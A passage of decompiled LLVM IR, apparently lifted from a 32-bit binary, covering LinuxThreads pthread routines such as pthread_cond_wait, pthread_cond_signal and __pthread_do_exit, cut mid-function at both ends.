  %v0_804e593 = phi i32 [ 22, %dec_label_pc_804e40c.dec_label_pc_804e590_crit_edge ], [ %storemerge1, %dec_label_pc_804e58d ]
  ret i32 %v0_804e593

; uselistorder directives
  uselistorder i32 %v0_804e4cd, { 1, 0 }
  uselistorder i32 %v3_804e400, { 1, 0 }
  uselistorder i32 %v2_804e3ef, { 11, 10, 12, 5, 6, 7, 2, 1, 8, 9, 4, 13, 3, 14, 15, 16, 17, 0 }
  uselistorder i32 %v4_804e3eb, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i32* %stack_var_-56, { 0, 3, 4, 1, 5, 2 }
  uselistorder i32* %stack_var_-60, { 4, 5, 0, 6, 7, 1, 8, 3, 9, 10, 2, 11 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804e590, { 1, 0 }
  uselistorder label %dec_label_pc_804e58d, { 1, 0 }
  uselistorder label %dec_label_pc_804e573, { 1, 0 }
  uselistorder label %dec_label_pc_804e558, { 1, 0 }
  uselistorder label %dec_label_pc_804e54c, { 1, 0 }
  uselistorder label %dec_label_pc_804e57c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804e4ed, { 1, 0 }
  uselistorder label %dec_label_pc_804e474, { 1, 0 }
}

define i32 @__GI_pthread_cond_wait(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804e59d = load i32, i32* @edi, align 4
  %v0_804e59e = load i32, i32* @esi, align 4
  %v0_804e59f = load i32, i32* @ebx, align 4
  store i32 %v0_804e59f, i32* %stack_var_-16, align 4
  %v4_804e59f = ptrtoint i32* %stack_var_-16 to i32
  %v2_804e5a3 = call i32 @thread_self.13(i32 %v0_804e59f, i32 %v0_804e59e)
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_804e5b1 = add i32 %arg2, 12
  %v2_804e5b1 = inttoptr i32 %v1_804e5b1 to i32*
  %v3_804e5b1 = load i32, i32* %v2_804e5b1, align 4
  %v9_804e5b4 = icmp eq i32 %v3_804e5b1, 3
  br i1 %v9_804e5b4, label %dec_label_pc_804e5ce, label %dec_label_pc_804e5b9

dec_label_pc_804e5b9:                             ; preds = %entry
  %v1_804e5b9 = icmp eq i32 %v3_804e5b1, 0
  br i1 %v1_804e5b9, label %dec_label_pc_804e5ce, label %dec_label_pc_804e5bd

dec_label_pc_804e5bd:                             ; preds = %dec_label_pc_804e5b9
  %v1_804e5c5 = add i32 %arg2, 8
  %v2_804e5c5 = inttoptr i32 %v1_804e5c5 to i32*
  %v3_804e5c5 = load i32, i32* %v2_804e5c5, align 4
  %v15_804e5c5 = icmp eq i32 %v3_804e5c5, %v2_804e5a3
  %v1_804e5c8 = icmp eq i1 %v15_804e5c5, false
  br i1 %v1_804e5c8, label %dec_label_pc_804e6ce, label %dec_label_pc_804e5ce

dec_label_pc_804e5ce:                             ; preds = %dec_label_pc_804e5bd, %dec_label_pc_804e5b9, %entry
  store i32 %arg1, i32* %stack_var_-28, align 4
  %v2_804e5db = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804e5db, i32* @edx, align 4
  %v1_804e5de = add i32 %v2_804e5a3, 441
  %v2_804e5de = inttoptr i32 %v1_804e5de to i8*
  store i8 0, i8* %v2_804e5de, align 1
  store i32 %v2_804e5a3, i32* @eax, align 4
  %v0_804e5e8 = load i32, i32* %stack_var_-28, align 4
  %v2_804e5e8 = call i32 @__pthread_set_own_extricate_if.11(i32 %v0_804e5e8, i32 134538143)
  %v0_804e5ed = load i32, i32* @esi, align 4
  store i32 %v0_804e5ed, i32* @eax, align 4
  store i32 %v2_804e5a3, i32* @edx, align 4
  %v1_804e5f2 = call i32 @__pthread_lock(i32 134538143)
  %v1_804e5fa = add i32 %v2_804e5a3, 66
  %v2_804e5fa = inttoptr i32 %v1_804e5fa to i8*
  %v3_804e5fa = load i8, i8* %v2_804e5fa, align 1
  %v4_804e5fa = icmp eq i8 %v3_804e5fa, 0
  br i1 %v4_804e5fa, label %dec_label_pc_804e60e, label %dec_label_pc_804e600

dec_label_pc_804e600:                             ; preds = %dec_label_pc_804e5ce
  store i32 1, i32* @ebx, align 4
  %v1_804e608 = add i32 %v2_804e5a3, 64
  %v2_804e608 = inttoptr i32 %v1_804e608 to i8*
  %v3_804e608 = load i8, i8* %v2_804e608, align 1
  %v4_804e608 = icmp eq i8 %v3_804e608, 0
  br i1 %v4_804e608, label %dec_label_pc_804e61b, label %dec_label_pc_804e60e

dec_label_pc_804e60e:                             ; preds = %dec_label_pc_804e600, %dec_label_pc_804e5ce
  store i32 %v2_804e5a3, i32* @edx, align 4
  %v0_804e614 = call i32 @enqueue.9()
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804e61b

dec_label_pc_804e61b:                             ; preds = %dec_label_pc_804e600, %dec_label_pc_804e60e
  %v0_804e61e = load i32, i32* @esi, align 4
  store i32 %v0_804e61e, i32* %stack_var_-60, align 4
  %v1_804e61f = inttoptr i32 %v0_804e61e to i32*
  %v2_804e61f = call i32 @__pthread_unlock(i32* %v1_804e61f)
  %v0_804e627 = load i32, i32* @ebx, align 4
  %v1_804e627 = icmp eq i32 %v0_804e627, 0
  br i1 %v1_804e627, label %dec_label_pc_804e639, label %dec_label_pc_804e62b

dec_label_pc_804e62b:                             ; preds = %dec_label_pc_804e61b
  store i32 %v2_804e5a3, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v0_804e630 = load i32, i32* %stack_var_-60, align 4
  %v1_804e630 = load i32, i32* %stack_var_-56, align 4
  %v2_804e630 = call i32 @__pthread_set_own_extricate_if.11(i32 %v0_804e630, i32 %v1_804e630)
  br label %dec_label_pc_804e6a7

dec_label_pc_804e639:                             ; preds = %dec_label_pc_804e61b
  store i32 0, i32* @ebx, align 4
  %v0_804e63e = load i32, i32* @edi, align 4
  store i32 %v0_804e63e, i32* %stack_var_-60, align 4
  %v1_804e63f = call i32 @pthread_mutex_unlock(i32 %v0_804e63e)
  %v1_804e65e = add i32 %v2_804e5a3, 440
  %v2_804e65e = inttoptr i32 %v1_804e65e to i8*
  %v1_804e66a = add i32 %v2_804e5a3, 64
  %v2_804e66a = inttoptr i32 %v1_804e66a to i8*
  store i32 %v2_804e5a3, i32* @eax, align 4
  %v0_804e64a16 = call i32 @suspend.14()
  %v3_804e65217 = load i8, i8* %v2_804e5de, align 1
  %v4_804e65218 = icmp eq i8 %v3_804e65217, 0
  %v1_804e65919 = icmp eq i1 %v4_804e65218, false
  br i1 %v1_804e65919, label %dec_label_pc_804e673, label %dec_label_pc_804e65b

dec_label_pc_804e65b:                             ; preds = %dec_label_pc_804e639, %dec_label_pc_804e670
  %v3_804e65e = load i8, i8* %v2_804e65e, align 1
  %v4_804e65e = icmp eq i8 %v3_804e65e, 0
  br i1 %v4_804e65e, label %dec_label_pc_804e670, label %dec_label_pc_804e667

dec_label_pc_804e667:                             ; preds = %dec_label_pc_804e65b
  %v3_804e66a = load i8, i8* %v2_804e66a, align 1
  %v4_804e66a = icmp eq i8 %v3_804e66a, 0
  br i1 %v4_804e66a, label %dec_label_pc_804e673, label %dec_label_pc_804e670

dec_label_pc_804e670:                             ; preds = %dec_label_pc_804e667, %dec_label_pc_804e65b
  %v0_804e670 = load i32, i32* @ebx, align 4
  %v1_804e670 = add i32 %v0_804e670, 1
  store i32 %v1_804e670, i32* @ebx, align 4
  store i32 %v2_804e5a3, i32* @eax, align 4
  %v0_804e64a = call i32 @suspend.14()
  %v3_804e652 = load i8, i8* %v2_804e5de, align 1
  %v4_804e652 = icmp eq i8 %v3_804e652, 0
  %v1_804e659 = icmp eq i1 %v4_804e652, false
  br i1 %v1_804e659, label %dec_label_pc_804e673, label %dec_label_pc_804e65b

dec_label_pc_804e673:                             ; preds = %dec_label_pc_804e670, %dec_label_pc_804e667, %dec_label_pc_804e639
  store i32 %v2_804e5a3, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v0_804e678 = load i32, i32* %stack_var_-60, align 4
  %v1_804e678 = load i32, i32* %stack_var_-56, align 4
  %v2_804e678 = call i32 @__pthread_set_own_extricate_if.11(i32 %v0_804e678, i32 %v1_804e678)
  %v3_804e680 = load i8, i8* %v2_804e65e, align 1
  %v4_804e680 = icmp eq i8 %v3_804e680, 0
  br i1 %v4_804e680, label %dec_label_pc_804e6ba, label %dec_label_pc_804e689

dec_label_pc_804e689:                             ; preds = %dec_label_pc_804e673
  %v3_804e68c = load i8, i8* %v2_804e66a, align 1
  %v4_804e68c = icmp eq i8 %v3_804e68c, 0
  %v1_804e690 = icmp eq i1 %v4_804e68c, false
  br i1 %v1_804e690, label %dec_label_pc_804e6ba, label %dec_label_pc_804e692

dec_label_pc_804e692:                             ; preds = %dec_label_pc_804e689
  store i8 0, i8* %v2_804e65e, align 1
  %v0_804e69f = load i32, i32* @edi, align 4
  store i32 %v0_804e69f, i32* %stack_var_-60, align 4
  %v1_804e6a0 = call i32 @pthread_mutex_lock(i32 %v0_804e69f)
  store i32 %v0_804e69f, i32* @ebx, align 4
  %v2_804e6a6 = load i32, i32* %stack_var_-56, align 4
  store i32 %v2_804e6a6, i32* @esi, align 4
  br label %dec_label_pc_804e6a7

dec_label_pc_804e6a7:                             ; preds = %dec_label_pc_804e62b, %dec_label_pc_804e692
  store i32 %v4_804e59f, i32* %stack_var_-56, align 4
  store i32 -1, i32* %stack_var_-60, align 4
  %v2_804e6ad = call i32 @__pthread_do_exit(i32 -1, i32 %v4_804e59f)
  br label %dec_label_pc_804e6b2

dec_label_pc_804e6b2:                             ; preds = %dec_label_pc_804e6ba, %dec_label_pc_804e6a7
  store i32 %v2_804e5a3, i32* @eax, align 4
  %v0_804e6b5 = call i32 @restart.12()
  br label %dec_label_pc_804e6ba

dec_label_pc_804e6ba:                             ; preds = %dec_label_pc_804e689, %dec_label_pc_804e673, %dec_label_pc_804e6b2
  %v0_804e6ba = load i32, i32* @ebx, align 4
  %v1_804e6ba = add i32 %v0_804e6ba, -1
  store i32 %v1_804e6ba, i32* @ebx, align 4
  %v10_804e6bb = icmp eq i32 %v0_804e6ba, 0
  %v1_804e6be = icmp eq i1 %v10_804e6bb, false
  br i1 %v1_804e6be, label %dec_label_pc_804e6b2, label %dec_label_pc_804e6c0

dec_label_pc_804e6c0:                             ; preds = %dec_label_pc_804e6ba
  %v0_804e6c3 = load i32, i32* @edi, align 4
  store i32 %v0_804e6c3, i32* %stack_var_-60, align 4
  %v1_804e6c4 = call i32 @pthread_mutex_lock(i32 %v0_804e6c3)
  br label %dec_label_pc_804e6ce

dec_label_pc_804e6ce:                             ; preds = %dec_label_pc_804e5bd, %dec_label_pc_804e6c0
  %v0_804e6d1 = phi i32 [ 22, %dec_label_pc_804e5bd ], [ 0, %dec_label_pc_804e6c0 ]
  %v2_804e6d3 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804e6d3, i32* @ebx, align 4
  store i32 %v0_804e59e, i32* @esi, align 4
  store i32 %v0_804e59d, i32* @edi, align 4
  ret i32 %v0_804e6d1

; uselistorder directives
  uselistorder i8* %v2_804e5de, { 1, 0, 2 }
  uselistorder i32 %v3_804e5b1, { 1, 0 }
  uselistorder i32 %v2_804e5a3, { 6, 7, 8, 1, 4, 5, 3, 9, 2, 11, 10, 12, 13, 0 }
  uselistorder i32 %v4_804e59f, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i32* %stack_var_-56, { 2, 3, 0, 1 }
  uselistorder i32* %stack_var_-60, { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder i32 ()* @suspend.14, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @__pthread_set_own_extricate_if.11, { 2, 1, 0, 6, 5, 4, 3 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804e6ce, { 1, 0 }
  uselistorder label %dec_label_pc_804e6ba, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e6a7, { 1, 0 }
  uselistorder label %dec_label_pc_804e65b, { 1, 0 }
  uselistorder label %dec_label_pc_804e61b, { 1, 0 }
}

define i32 @pthread_cond_signal(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804e6d9 = load i32, i32* @ebx, align 4
  store i32 0, i32* @edx, align 4
  store i32 %arg1, i32* @esi, align 4
  store i32 %arg1, i32* @eax, align 4
  %v1_804e6e5 = call i32 @__pthread_lock(i32 %v0_804e6d9)
  %v0_804e6ea = load i32, i32* @esi, align 4
  %v1_804e6ea = add i32 %v0_804e6ea, 8
  %v2_804e6ea = inttoptr i32 %v1_804e6ea to i32*
  %v3_804e6ea = load i32, i32* %v2_804e6ea, align 4
  store i32 %v3_804e6ea, i32* @ebx, align 4
  %v1_804e6ed = icmp eq i32 %v3_804e6ea, 0
  br i1 %v1_804e6ed, label %dec_label_pc_804e6fe, label %dec_label_pc_804e6f1

dec_label_pc_804e6f1:                             ; preds = %entry
  %v1_804e6f1 = add i32 %v3_804e6ea, 8
  %v2_804e6f1 = inttoptr i32 %v1_804e6f1 to i32*
  %v3_804e6f1 = load i32, i32* %v2_804e6f1, align 4
  store i32 %v3_804e6f1, i32* %v2_804e6ea, align 4
  store i32 0, i32* %v2_804e6f1, align 4
  %v0_804e701.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e6fe

dec_label_pc_804e6fe:                             ; preds = %entry, %dec_label_pc_804e6f1
  %v0_804e701 = phi i32 [ %v0_804e6ea, %entry ], [ %v0_804e701.pre, %dec_label_pc_804e6f1 ]
  %v1_804e702 = inttoptr i32 %v0_804e701 to i32*
  %v2_804e702 = call i32 @__pthread_unlock(i32* %v1_804e702)
  br i1 %v1_804e6ed, label %dec_label_pc_804e71c, label %dec_label_pc_804e70e

dec_label_pc_804e70e:                             ; preds = %dec_label_pc_804e6fe
  %v1_804e70e = add i32 %v3_804e6ea, 441
  %v2_804e70e = inttoptr i32 %v1_804e70e to i8*
  store i8 1, i8* %v2_804e70e, align 1
  store i32 %v3_804e6ea, i32* @eax, align 4
  %v0_804e717 = call i32 @restart.12()
  br label %dec_label_pc_804e71c

dec_label_pc_804e71c:                             ; preds = %dec_label_pc_804e6fe, %dec_label_pc_804e70e
  ret i32 0

; uselistorder directives
  uselistorder i1 %v1_804e6ed, { 1, 0 }
  uselistorder i32 %v3_804e6ea, { 0, 2, 1, 3, 4 }
  uselistorder i32 ()* @restart.12, { 3, 1, 2, 0 }
  uselistorder i32 441, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804e71c, { 1, 0 }
  uselistorder label %dec_label_pc_804e6fe, { 1, 0 }
}

define i32 @__linuxthreads_create_event() local_unnamed_addr {
entry:
  %v0_804e724 = load i32, i32* @eax, align 4
  ret i32 %v0_804e724
}

define i32 @__linuxthreads_death_event() local_unnamed_addr {
entry:
  %v0_804e725 = load i32, i32* @eax, align 4
  ret i32 %v0_804e725
}

define i32 @__linuxthreads_reap_event() local_unnamed_addr {
entry:
  %v0_804e726 = load i32, i32* @eax, align 4
  ret i32 %v0_804e726
}

define i32 @__pthread_set_own_extricate_if.15() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_804e728 = load i32, i32* @esi, align 4
  %v0_804e729 = load i32, i32* @ebx, align 4
  %v0_804e72d = load i32, i32* @eax, align 4
  store i32 %v0_804e72d, i32* @ebx, align 4
  %v0_804e72f = load i32, i32* @edx, align 4
  store i32 %v0_804e72f, i32* @esi, align 4
  %v1_804e731 = icmp eq i32 %v0_804e72f, 0
  br i1 %v1_804e731, label %dec_label_pc_804e73d, label %dec_label_pc_804e735

dec_label_pc_804e735:                             ; preds = %entry
  %v1_804e735 = add i32 %v0_804e72d, 64
  %v2_804e735 = inttoptr i32 %v1_804e735 to i8*
  %v3_804e735 = load i8, i8* %v2_804e735, align 1
  %v4_804e735 = icmp eq i8 %v3_804e735, 0
  %v1_804e739 = icmp eq i1 %v4_804e735, false
  br i1 %v1_804e739, label %dec_label_pc_804e75f, label %dec_label_pc_804e747

dec_label_pc_804e73d:                             ; preds = %entry
  %v1_804e73d = add i32 %v0_804e72d, 28
  %v2_804e73d = inttoptr i32 %v1_804e73d to i32*
  %v3_804e73d = load i32, i32* %v2_804e73d, align 4
  store i32 %v3_804e73d, i32* @eax, align 4
  store i32 %v0_804e72d, i32* @edx, align 4
  %v1_804e742 = call i32 @__pthread_lock(i32 %v0_804e729)
  %v1_804e747.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e747

dec_label_pc_804e747:                             ; preds = %dec_label_pc_804e735, %dec_label_pc_804e73d
  %v1_804e747 = phi i32 [ %v0_804e72d, %dec_label_pc_804e735 ], [ %v1_804e747.pre, %dec_label_pc_804e73d ]
  %v2_804e747 = add i32 %v1_804e747, 444
  %v3_804e747 = inttoptr i32 %v2_804e747 to i32*
  store i32 %v0_804e72f, i32* %v3_804e747, align 4
  %v1_804e74f = icmp eq i1 %v1_804e731, false
  br i1 %v1_804e74f, label %dec_label_pc_804e75f, label %dec_label_pc_804e751

dec_label_pc_804e751:                             ; preds = %dec_label_pc_804e747
  %v0_804e754 = load i32, i32* @ebx, align 4
  %v1_804e754 = add i32 %v0_804e754, 28
  %v2_804e754 = inttoptr i32 %v1_804e754 to i32*
  %v3_804e754 = load i32, i32* %v2_804e754, align 4
  %v1_804e757 = inttoptr i32 %v3_804e754 to i32*
  %v2_804e757 = call i32 @__pthread_unlock(i32* %v1_804e757)
  br label %dec_label_pc_804e75f

dec_label_pc_804e75f:                             ; preds = %dec_label_pc_804e747, %dec_label_pc_804e735, %dec_label_pc_804e751
  %v2_804e75f = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_804e729, i32* @ebx, align 4
  store i32 %v0_804e728, i32* @esi, align 4
  ret i32 %v2_804e75f

; uselistorder directives
  uselistorder i1 %v1_804e731, { 1, 0 }
  uselistorder i32 444, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_804e75f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e747, { 1, 0 }
}

define i32 @thread_self.16(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %v0_804e76a = load i32, i32* @esp, align 4
  %v1_804e76a = load i32, i32* @global_var_8062fec.134, align 4
  %v7_804e76a = icmp ult i32 %v0_804e76a, %v1_804e76a
  %v1_804e770 = icmp eq i1 %v7_804e76a, false
  br i1 %v1_804e770, label %dec_label_pc_804e7a1, label %dec_label_pc_804e772

dec_label_pc_804e772:                             ; preds = %entry
  %v1_804e772 = load i32, i32* @global_var_8062ff0.135, align 16
  %v7_804e772 = icmp ult i32 %v0_804e76a, %v1_804e772
  br i1 %v7_804e772, label %dec_label_pc_804e787, label %dec_label_pc_804e77a

dec_label_pc_804e77a:                             ; preds = %dec_label_pc_804e772
  %v1_804e77f = load i32, i32* @global_var_8062ff4.137, align 4
  %v7_804e77f = icmp ult i32 %v0_804e76a, %v1_804e77f
  br i1 %v7_804e77f, label %dec_label_pc_804e7a1, label %dec_label_pc_804e787

dec_label_pc_804e787:                             ; preds = %dec_label_pc_804e77a, %dec_label_pc_804e772
  %v0_804e787 = load i32, i32* @global_var_8067650.138, align 16
  %v1_804e787 = icmp eq i32 %v0_804e787, 0
  br i1 %v1_804e787, label %dec_label_pc_804e795, label %dec_label_pc_804e790

dec_label_pc_804e790:                             ; preds = %dec_label_pc_804e787
  %v0_804e790 = call i32 @__pthread_find_self()
  br label %dec_label_pc_804e795

dec_label_pc_804e795:                             ; preds = %dec_label_pc_804e787, %dec_label_pc_804e790
  %v2_804e79b = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_804e7a1

dec_label_pc_804e7a1:                             ; preds = %dec_label_pc_804e77a, %entry, %dec_label_pc_804e795
  %v0_804e7a1 = phi i32 [ ptrtoint (i32* @global_var_8062500.136 to i32), %dec_label_pc_804e77a ], [ ptrtoint (i32* @global_var_8062320 to i32), %entry ], [ %v2_804e79b, %dec_label_pc_804e795 ]
  ret i32 %v0_804e7a1

; uselistorder directives
  uselistorder label %dec_label_pc_804e7a1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e795, { 1, 0 }
}

define i32 @join_extricate_func(i32 %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %v0_804e7a2 = load i32, i32* @esi, align 4
  %v0_804e7a3 = load i32, i32* @ebx, align 4
  %v2_804e7a7 = call i32 @thread_self.16(i32 %v0_804e7a3, i32 %v0_804e7a2)
  store i32 %arg1, i32* @ebx, align 4
  store i32 %v2_804e7a7, i32* @edx, align 4
  store i32 %arg1, i32* @eax, align 4
  %v1_804e7ba = call i32 @__pthread_lock(i32 %v2_804e7a7)
  %v0_804e7bf = load i32, i32* @ebx, align 4
  %v1_804e7bf = add i32 %v0_804e7bf, 8
  %v2_804e7bf = inttoptr i32 %v1_804e7bf to i32*
  %v3_804e7bf = load i32, i32* %v2_804e7bf, align 4
  %v1_804e7c2 = add i32 %v3_804e7bf, 56
  %v2_804e7c2 = inttoptr i32 %v1_804e7c2 to i32*
  %v3_804e7c2 = load i32, i32* %v2_804e7c2, align 4
  %v4_804e7c2 = icmp eq i32 %v3_804e7c2, 0
  %v1_804e7c6 = icmp eq i1 %v4_804e7c2, false
  %v2_804e7c6 = zext i1 %v1_804e7c6 to i32
  %v3_804e7c6 = load i32, i32* @edx, align 4
  %v4_804e7c6 = and i32 %v3_804e7c6, -256
  %v5_804e7c6 = or i32 %v2_804e7c6, %v4_804e7c6
  store i32 %v5_804e7c6, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v2_804e7c2, align 4
  %v0_804e7d3 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e7d3 = urem i32 %v0_804e7d3, 256
  store i32 %v1_804e7d3, i32* @esi, align 4
  %v0_804e7d6 = load i32, i32* @ebx, align 4
  %v1_804e7d7 = inttoptr i32 %v0_804e7d6 to i32*
  %v2_804e7d7 = call i32 @__pthread_unlock(i32* %v1_804e7d7)
  %v0_804e7dc = load i32, i32* @esi, align 4
  ret i32 %v0_804e7dc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @suspend.17() local_unnamed_addr {
entry:
  %v0_804e7e7 = load i32, i32* @eax, align 4
  %v1_804e7e8 = call i32 @__pthread_wait_for_restart_signal(i32 %v0_804e7e7)
  ret i32 %v1_804e7e8

; uselistorder directives
  uselistorder i32 (i32)* @__pthread_wait_for_restart_signal, { 1, 2, 4, 5, 0, 3, 6 }
}

define i32 @__pthread_do_exit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-188 = alloca i32, align 4
  %v0_804e7f1 = load i32, i32* @esi, align 4
  %v0_804e7f2 = load i32, i32* @ebx, align 4
  %v2_804e7f9 = call i32 @thread_self.16(i32 %v0_804e7f2, i32 %v0_804e7f1)
  store i32 %v2_804e7f9, i32* @ebx, align 4
  %v1_804e803 = add i32 %v2_804e7f9, 64
  %v2_804e803 = inttoptr i32 %v1_804e803 to i8*
  store i8 1, i8* %v2_804e803, align 1
  %v1_804e807 = add i32 %v2_804e7f9, 65
  %v2_804e807 = inttoptr i32 %v1_804e807 to i8*
  store i8 0, i8* %v2_804e807, align 1
  store i32 %arg2, i32* %stack_var_-188, align 4
  %v1_804e812 = call i32 @__pthread_perform_cleanup(i32 %arg2)
  %v0_804e817 = call i32 @__pthread_destroy_specifics()
  %v0_804e81c = load i32, i32* @ebx, align 4
  %v1_804e81c = add i32 %v0_804e81c, 28
  %v2_804e81c = inttoptr i32 %v1_804e81c to i32*
  %v3_804e81c = load i32, i32* %v2_804e81c, align 4
  store i32 %v3_804e81c, i32* @eax, align 4
  store i32 %v0_804e81c, i32* @edx, align 4
  %v0_804e821 = load i32, i32* %stack_var_-188, align 4
  %v1_804e821 = call i32 @__pthread_lock(i32 %v0_804e821)
  %v1_804e82d = load i32, i32* @ebx, align 4
  %v2_804e82d = add i32 %v1_804e82d, 48
  %v3_804e82d = inttoptr i32 %v2_804e82d to i32*
  store i32 %arg1, i32* %v3_804e82d, align 4
  %v0_804e833 = load i32, i32* @ebx, align 4
  %v1_804e833 = add i32 %v0_804e833, 412
  %v2_804e833 = inttoptr i32 %v1_804e833 to i32*
  %v3_804e833 = load i32, i32* %v2_804e833, align 4
  %v4_804e833 = icmp eq i32 %v3_804e833, 0
  br i1 %v4_804e833, label %dec_label_pc_804e867, label %dec_label_pc_804e83c

dec_label_pc_804e83c:                             ; preds = %entry
  %v0_804e83c = load i32, i32* @global_var_8067654.149, align 4
  %v2_804e841 = add i32 %v0_804e833, 416
  %v3_804e841 = inttoptr i32 %v2_804e841 to i32*
  %v4_804e841 = load i32, i32* %v3_804e841, align 4
  %v5_804e841 = or i32 %v4_804e841, %v0_804e83c
  store i32 %v5_804e841, i32* @eax, align 4
  %v3_804e847 = and i32 %v5_804e841, 256
  %v4_804e847 = icmp eq i32 %v3_804e847, 0
  br i1 %v4_804e847, label %dec_label_pc_804e867, label %dec_label_pc_804e84c

dec_label_pc_804e84c:                             ; preds = %dec_label_pc_804e83c
  %v1_804e84c = add i32 %v0_804e833, 424
  %v2_804e84c = inttoptr i32 %v1_804e84c to i32*
  store i32 9, i32* %v2_804e84c, align 4
  %v0_804e856 = load i32, i32* @ebx, align 4
  %v2_804e856 = add i32 %v0_804e856, 428
  %v3_804e856 = inttoptr i32 %v2_804e856 to i32*
  store i32 %v0_804e856, i32* %v3_804e856, align 4
  %v0_804e85c = load i32, i32* @ebx, align 4
  store i32 %v0_804e85c, i32* @global_var_806765c.150, align 4
  %v0_804e862 = call i32 @__linuxthreads_death_event()
  %v0_804e86a.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e867

dec_label_pc_804e867:                             ; preds = %dec_label_pc_804e83c, %entry, %dec_label_pc_804e84c
  %v0_804e86a = phi i32 [ %v0_804e833, %dec_label_pc_804e83c ], [ %v0_804e833, %entry ], [ %v0_804e86a.pre, %dec_label_pc_804e84c ]
  %v1_804e86a = add i32 %v0_804e86a, 56
  %v2_804e86a = inttoptr i32 %v1_804e86a to i32*
  %v3_804e86a = load i32, i32* %v2_804e86a, align 4
  %v1_804e86d = add i32 %v0_804e86a, 44
  %v2_804e86d = inttoptr i32 %v1_804e86d to i8*
  store i8 1, i8* %v2_804e86d, align 1
  %v0_804e871 = load i32, i32* @ebx, align 4
  %v1_804e871 = add i32 %v0_804e871, 28
  %v2_804e871 = inttoptr i32 %v1_804e871 to i32*
  %v3_804e871 = load i32, i32* %v2_804e871, align 4
  store i32 %v3_804e871, i32* %stack_var_-188, align 4
  %v1_804e874 = inttoptr i32 %v3_804e871 to i32*
  %v2_804e874 = call i32 @__pthread_unlock(i32* %v1_804e874)
  %v1_804e87c = icmp eq i32 %v3_804e86a, 0
  br i1 %v1_804e87c, label %dec_label_pc_804e88c, label %dec_label_pc_804e880

dec_label_pc_804e880:                             ; preds = %dec_label_pc_804e867
  store i32 %v3_804e86a, i32* %stack_var_-188, align 4
  %v1_804e884 = call i32 @__pthread_restart_new(i32 %v3_804e86a)
  br label %dec_label_pc_804e88c

dec_label_pc_804e88c:                             ; preds = %dec_label_pc_804e867, %dec_label_pc_804e880
  %v0_804e88c = load i32, i32* bitcast (i32** @global_var_80626e0.144 to i32*), align 32
  store i32 %v0_804e88c, i32* @esi, align 4
  %v0_804e892 = load i32, i32* @ebx, align 4
  %v12_804e892 = icmp eq i32 %v0_804e892, %v0_804e88c
  %v1_804e894 = icmp eq i1 %v12_804e892, false
  br i1 %v1_804e894, label %dec_label_pc_804e8e2, label %dec_label_pc_804e896

dec_label_pc_804e896:                             ; preds = %dec_label_pc_804e88c
  %v0_804e896 = load i32, i32* @global_var_80626e4.143, align 4
  %v2_804e896 = icmp slt i32 %v0_804e896, 0
  br i1 %v2_804e896, label %dec_label_pc_804e8e2, label %dec_label_pc_804e89f

dec_label_pc_804e89f:                             ; preds = %dec_label_pc_804e896
  store i32 %v0_804e88c, i32* %stack_var_-156, align 4
  %v2_804e8ab = ptrtoint i32* %stack_var_-156 to i32
  br label %dec_label_pc_804e8ab

dec_label_pc_804e8ab:                             ; preds = %dec_label_pc_804e8c7.dec_label_pc_804e8ab_crit_edge, %dec_label_pc_804e89f
  %v0_804e8b6 = phi i32 [ %v0_804e8b6.pre, %dec_label_pc_804e8c7.dec_label_pc_804e8ab_crit_edge ], [ %v0_804e896, %dec_label_pc_804e89f ]
  store i32 %v0_804e8b6, i32* %stack_var_-188, align 4
  %v3_804e8bc = call i32 @__libc_write(i32 %v0_804e8b6, i32 %v2_804e8ab, i32 148)
  %v8_804e8c4 = icmp eq i32 %v3_804e8bc, -1
  %v1_804e8c5 = icmp eq i1 %v8_804e8c4, false
  br i1 %v1_804e8c5, label %dec_label_pc_804e8d1, label %dec_label_pc_804e8c7

dec_label_pc_804e8c7:                             ; preds = %dec_label_pc_804e8ab
  %v0_804e8c7 = load i32, i32* %stack_var_-188, align 4
  %v1_804e8c7 = call i32 @__errno_location(i32 %v0_804e8c7)
  %v1_804e8cc = inttoptr i32 %v1_804e8c7 to i32*
  %v2_804e8cc = load i32, i32* %v1_804e8cc, align 4
  %v11_804e8cc = icmp eq i32 %v2_804e8cc, 4
